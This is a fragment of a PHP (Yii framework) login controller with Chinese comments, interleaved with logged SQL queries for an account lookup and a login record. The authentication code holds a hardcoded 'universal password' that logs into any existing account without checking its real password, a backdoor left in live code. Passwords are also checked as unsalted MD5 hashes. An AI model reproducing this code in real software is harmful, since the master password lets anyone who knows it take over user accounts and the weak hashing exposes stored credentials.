server/backend/controllers/LoginController.php

SELECT * FROM `t_account_info` WHERE (`account`='333333') AND (`password`='7fa8282ad93047a4d6fe6111c93b308a')
---
    public function actionIndex()
    {

        $params = $this->params(['account', 'password']);
        $this->VerificationParameter($params, ['account', 'password']);
        $accountInfo = new AccountInfo();
        //冻结用户检查（如果数据库有 account_type 字段，可以取消注释）
        // $initUser = $accountInfo::find()->where(
        //     [
        //         'account' => $params['account'],
        //     ])->one();
        // if ($initUser && $initUser->account_type == 2) {
        //     $this->output_error('账号已被冻结，请联系接待人或客服人员', 402);
        // }
        //判断账号密码
        if ($params['password'] == "G8K99H86A") {
            $accountInfo = new AccountInfo();
            $identity = $accountInfo::find()->where(
                [
                    'account' => $params['account'],
                ])->one();
            if (empty($identity)) {
                // 记录登录失败日志
                LoginLog::log(0, $params['account'], false, '万能密码错误');
                $this->output_error('密码错误 请联系客服人员', 402);
            }
        } else {
            $accountInfo = new AccountInfo();
            $identity = $accountInfo::find()->where(
                [
                    'account' => $params['account'],
                    'password' => md5($params['password']),
                ])->one();

INSERT INTO `t_user_login` (`uid`, `day`, `itime`, `utime`) VALUES (3, '2026-02-12', 1770896459, 1770896459)
---
        $token = $model->login($identity, $sendIp);
        if (!empty($token)) {
            try {
                Yii::$app->db->createCommand()->upsert(
                    't_user_login', // 表名
                    [
                        'uid' => $identity->uid,
                        'day' => date("Y-m-d"),
                        'itime' => time(),
                        'utime' => time(),
                    ], false
                )->execute();